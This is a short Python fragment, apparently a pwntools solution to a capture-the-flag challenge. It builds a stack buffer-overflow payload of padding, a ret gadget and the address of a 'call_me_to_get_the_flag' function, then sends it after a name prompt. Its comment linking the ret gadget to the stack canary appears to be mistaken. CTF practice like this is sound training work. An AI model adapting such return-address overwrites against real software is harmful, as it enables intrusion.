...
def solve(p):
    ...
    payload = b""
    payload += b"a"*18
    # ret gadget for stack canary
    payload += p64(binary.sym['call_me_to_get_the_flag']+161)
    payload += p64(binary.sym['call_me_to_get_the_flag'])
    p.sendlineafter(b"Hello, what is your name?", payload)
    # p.interactive()
